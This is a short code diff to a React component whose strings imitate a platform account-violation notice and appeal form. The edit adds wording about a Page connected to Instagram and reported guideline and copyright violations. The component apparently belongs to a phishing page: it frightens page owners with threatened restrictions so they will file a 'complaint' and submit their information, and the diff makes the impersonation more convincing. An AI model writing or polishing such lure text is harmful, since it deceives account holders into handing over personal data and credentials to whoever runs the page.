@@ -17,7 +17,7 @@ const Home = () => {
             privacySecurity: 'Privacy, Safety and Security',
             policiesReporting: 'Policies and Reporting',
             pagePolicyAppeals: 'Account Policy Complaints',
-            detectedActivity: 'We have detected unusual activity on your account that violates our community standards.',
+            detectedActivity: 'We have detected unusual activity on your Page connected to your Instagram, including reported guideline and copyright violations.',
             accessLimited: 'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.',
             submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
             pageName: 'Name',
